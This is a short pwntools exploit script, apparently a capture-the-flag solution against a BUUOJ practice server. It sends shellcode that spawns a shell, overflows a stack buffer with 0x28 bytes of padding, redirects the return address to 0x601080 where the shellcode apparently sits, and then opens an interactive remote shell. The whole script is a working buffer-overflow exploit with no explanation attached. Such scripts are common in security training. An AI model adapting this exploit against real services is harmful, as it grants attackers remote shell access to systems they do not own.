from pwn import *
context(arch='amd64',os='linux',log_level='debug') 

r=remote('node3.buuoj.cn',26906)
shellcode=asm(shellcraft.sh())

r.recvuntil('tell me your name')
r.sendline(shellcode)

payload='a'*0x28+p64(0x601080)
r.recvuntil('What do you want to say to me?')
r.sendline(payload)

r.interactive()
